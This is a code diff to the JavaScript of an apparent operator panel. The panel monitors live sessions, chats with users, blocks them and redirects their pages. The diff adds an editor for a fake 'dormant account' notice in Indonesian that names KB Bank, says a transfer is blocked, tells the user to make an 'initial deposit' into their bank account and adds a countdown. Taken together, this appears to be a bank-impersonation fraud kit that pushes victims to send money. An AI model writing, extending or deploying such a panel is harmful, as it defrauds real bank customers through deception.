@@ -14,6 +14,18 @@
   const baseTitle=document.title;
   const firebaseStatus=document.getElementById('firebaseStatus');
   const logoutAdmin=document.getElementById('logoutAdmin');
+  const dormantForm=document.getElementById('dormantEditorForm');
+  const dormantTitleInput=document.getElementById('dormantAdminTitle');
+  const dormantMessageInput=document.getElementById('dormantAdminMessage');
+  const dormantNoticeTitleInput=document.getElementById('dormantAdminNoticeTitle');
+  const dormantNoticeBodyInput=document.getElementById('dormantAdminNoticeBody');
+  const dormantMinutesInput=document.getElementById('dormantAdminMinutes');
+  const dormantSave=document.getElementById('dormantAdminSave');
+  const dormantReset=document.getElementById('dormantAdminReset');
+  const dormantStatus=document.getElementById('dormantAdminStatus');
+  const dormantOpen=document.getElementById('dormantOpen');
+  const dormantModal=document.getElementById('dormantAdminModal');
+  const dormantClose=document.getElementById('dormantAdminClose');
   let firebaseConnected=false;
   let runtime=null;
   let sessions=[];
@@ -22,6 +34,7 @@
   let messages=[];
   let stopMessages=null;
   let stopSessions=null;
+  let stopDormantConfig=null;
   let audioContext=null;
   let notificationsArmed=false;
   let permissionAsked=false;
@@ -32,6 +45,29 @@
   const fmt=value=>{const d=new Date(value);return Number.isNaN(d.getTime())?'-':d.toLocaleString('id-ID',{hour:'2-digit',minute:'2-digit',second:'2-digit'})};
   const newId=()=>crypto?.randomUUID?.()||`admin-${Date.now()}-${Math.random().toString(16).slice(2)}`;
   const selectedSession=()=>sessions.find(s=>s.firebaseUid===selectedUid)||null;
+  const DEFAULT_DORMANT=Object.freeze({
+    title:'INFORMASI REKENING DORMANT',
+    message:'Pemeriksaan mendeteksi status rekening dormant. Pemindahan saldo belum bisa di proses.',
+    noticeTitle:'Informasi Rekening',
+    noticeBody:'Rekening memerlukan verifikasi status sebelum proses dapat dilanjutkan. harap melakukan Pengisian saldo perdana ke rekening utama kb bank anda',
+    countdownSeconds:7200
+  });
+  const dormantInputs=[dormantTitleInput,dormantMessageInput,dormantNoticeTitleInput,dormantNoticeBodyInput,dormantMinutesInput].filter(Boolean);
+
+  function setDormantEditorEnabled(enabled){
+    dormantInputs.forEach(el=>{el.disabled=!enabled});
+    if(dormantSave)dormantSave.disabled=!enabled;
+    if(dormantReset)dormantReset.disabled=!enabled;
+    if(dormantOpen)dormantOpen.disabled=!enabled;
+  }
+  function renderDormantConfig(value){
+    const cfg=value||DEFAULT_DORMANT;
+    if(dormantTitleInput)dormantTitleInput.value=cfg.title||DEFAULT_DORMANT.title;
+    if(dormantMessageInput)dormantMessageInput.value=cfg.message||DEFAULT_DORMANT.message;
+    if(dormantNoticeTitleInput)dormantNoticeTitleInput.value=cfg.noticeTitle||DEFAULT_DORMANT.noticeTitle;
+    if(dormantNoticeBodyInput)dormantNoticeBodyInput.value=cfg.noticeBody||DEFAULT_DORMANT.noticeBody;
+    if(dormantMinutesInput)dormantMinutesInput.value=String(Math.max(1,Math.round(Number(cfg.countdownSeconds||7200)/60)));
+  }
 
   async function armNotifications(){
     if(notificationsArmed)return;
@@ -104,6 +140,10 @@
     if(stopMessages){try{stopMessages()}catch{}stopMessages=null;}
     stopMessages=await runtime.listenAdminMessages(uid,list=>{messages=list;renderMessages();void runtime.markAdminRead(uid);});
     await runtime.markAdminRead(uid);input.focus();
+    if(stopDormantConfig){try{stopDormantConfig()}catch{}stopDormantConfig=null;}
+    setDormantEditorEnabled(true);
+    if(dormantStatus)dormantStatus.textContent='Memuat konfigurasi dormant…';
+    stopDormantConfig=await runtime.listenAdminDormantConfig(uid,value=>{renderDormantConfig(value);if(dormantStatus)dormantStatus.textContent=value?'Konfigurasi khusus sesi ini aktif.':'Menggunakan konfigurasi default.';});
   }
 
   function onSessions(next){
@@ -129,6 +169,51 @@
     input.focus();
   });
 
+  function openDormantEditor(){
+    if(!selectedUid||!dormantModal)return;
+    dormantModal.hidden=false;
+    document.documentElement.style.overflow='hidden';
+    setTimeout(()=>dormantTitleInput?.focus(),0);
+  }
+  function closeDormantEditor(){
+    if(!dormantModal)return;
+    dormantModal.hidden=true;
+    document.documentElement.style.overflow='';
+  }
+  dormantOpen?.addEventListener('click',openDormantEditor);
+  dormantClose?.addEventListener('click',closeDormantEditor);
+  dormantModal?.addEventListener('click',event=>{if(event.target===dormantModal)closeDormantEditor();});
+  window.addEventListener('keydown',event=>{if(event.key==='Escape'&&dormantModal&&!dormantModal.hidden)closeDormantEditor();});
+
+  dormantForm?.addEventListener('submit',async event=>{
+    event.preventDefault();
+    if(!selectedUid)return;
+    const minutes=Math.max(1,Math.min(1440,Math.round(Number(dormantMinutesInput?.value)||120)));
+    const payload={
+      title:String(dormantTitleInput?.value||'').trim(),
+      message:String(dormantMessageInput?.value||'').trim(),
+      noticeTitle:String(dormantNoticeTitleInput?.value||'').trim(),
+      noticeBody:String(dormantNoticeBodyInput?.value||'').trim(),
+      countdownSeconds:minutes*60
+    };
+    if(!payload.title||!payload.message||!payload.noticeTitle||!payload.noticeBody){if(dormantStatus)dormantStatus.textContent='Semua kolom notifikasi wajib diisi.';return;}
+    if(dormantSave)dormantSave.disabled=true;
+    if(dormantStatus)dormantStatus.textContent='Menyimpan…';
+    const ok=await runtime.saveAdminDormantConfig(selectedUid,payload);
+    if(dormantStatus)dormantStatus.textContent=ok?'Notifikasi dormant tersimpan realtime.':'Gagal menyimpan konfigurasi.';
+    if(dormantSave)dormantSave.disabled=!selectedUid;
+  });
+
+  dormantReset?.addEventListener('click',async()=>{
+    if(!selectedUid)return;
+    dormantReset.disabled=true;
+    if(dormantStatus)dormantStatus.textContent='Mengembalikan default…';
+    const ok=await runtime.resetAdminDormantConfig(selectedUid);
+    if(ok)renderDormantConfig(null);
+    if(dormantStatus)dormantStatus.textContent=ok?'Konfigurasi dikembalikan ke default.':'Gagal mengembalikan konfigurasi.';
+    dormantReset.disabled=!selectedUid;
+  });
+
   navSend.addEventListener('click',async()=>{
     const s=selectedSession();if(!s)return;if(s.blocked){navStatus.textContent='User sedang diblokir. Buka blokir sebelum memindahkan halaman.';return;}
     const target=String(navTarget.value||'').trim();navSend.disabled=true;navStatus.textContent='Mengirim perintah perpindahan...';
@@ -146,6 +231,7 @@
       await Promise.resolve(window.KBFirebaseBoot);runtime=window.KBFirebaseRuntime;
       if(!runtime?.isAdminConfigured?.()){location.replace('admin-login-firebase.html');return;}
       const admin=await runtime.requireAdmin();if(!admin){location.replace('admin-login-firebase.html');return;}
+      setDormantEditorEnabled(false);
       stopSessions=await runtime.listenAdminSessions(onSessions);
       firebaseConnected=true;
       if(firebaseStatus){firebaseStatus.textContent='Firebase Terhubung';firebaseStatus.className='badge ok';}
@@ -162,6 +248,6 @@
 
   const arm=()=>{void armNotifications()};
   window.addEventListener('pointerdown',arm,{once:true,capture:true});window.addEventListener('keydown',arm,{once:true,capture:true});
-  window.addEventListener('pagehide',()=>{try{stopSessions?.()}catch{}try{stopMessages?.()}catch{}});
+  window.addEventListener('pagehide',()=>{document.documentElement.style.overflow='';try{stopSessions?.()}catch{}try{stopMessages?.()}catch{}try{stopDormantConfig?.()}catch{}});
   void init();
 })();
